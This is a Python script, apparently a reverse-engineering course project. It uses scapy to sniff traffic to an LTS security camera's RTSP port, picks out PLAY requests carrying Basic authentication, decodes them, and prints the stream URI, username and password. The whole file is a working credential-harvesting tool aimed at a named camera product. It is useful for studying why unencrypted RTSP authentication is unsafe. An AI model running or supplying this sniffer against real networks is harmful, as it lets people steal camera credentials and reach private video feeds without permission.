#!/usr/bin/env python3

###############################################################################
# (c) 2022 Michael MacFadden
#
# DSU CSC-844 Advanced Reverse Engineering
# Final Project
###############################################################################

from scapy.all import sniff, Packet
from scapy.packet import Raw
from scapy.layers.inet import TCP
import argparse
import base64

from scapy.config import conf
conf.use_pcap = True

AUTH_HEADER = "Authorization: Basic "
PLAY_COMMAND = "PLAY"

def process_packet(packet: Packet) -> None:
    """Processes packets sniffed for the specified host / port.

    This method looks for TCP Packets with the RTSP PLAY command as well
    as an Authorization header. If found it will print the URI of the 
    stream, the auth token, and the decoded username and password.
    """
    if (packet.haslayer(TCP) and packet.haslayer(Raw)):
        data = None
        try:
            data = packet[TCP].payload.load.decode("UTF-8")
        except:
            # This simply means its a binary payload that is not
            # valid UTF-8, which will happen for embedded RTP data.
            pass

        if data != None and (AUTH_HEADER in data and PLAY_COMMAND in data):
            print("-----------------------------------")
            print("RTSP Stream Authentication Detected")
            print("-----------------------------------")

            lines = data.split("\r\n") 
            command_line = lines[0]
            uri = command_line.split(" ")[1]
            print(f"RTSP Stream: \t{uri}")

            auth_lines = list(filter(lambda x: AUTH_HEADER in x, lines))
            auth_line = auth_lines[0]
            token = auth_line[len(AUTH_HEADER):]
            print(f"Auth Token: \t{token}")
            
            decoded = base64.b64decode(token).decode("UTF-8")
            colon = decoded.index(":")
            username = decoded[0:colon]
            password = decoded[colon+1:]

            print(f"Username: \t{username}")
            print(f"Password: \t{password}\n")

##
## Process command line arguments
##
parser = argparse.ArgumentParser(description='Extracts authentication credentials from an unprotected RTSP stream.')
parser.add_argument('host', metavar='host', type=str,
                    help='The hostname or address of the LTS camera')
parser.add_argument('port', metavar='port', type=int,
                    help='The the RTSP port of the LTS camera')


args = parser.parse_args()   

print("\nExtracting RTSP Stream Authentication...\n")

##
## Start Sniffing
## 
sniff(iface="en0", filter=f"host {args.host} and port {args.port}", prn=process_packet)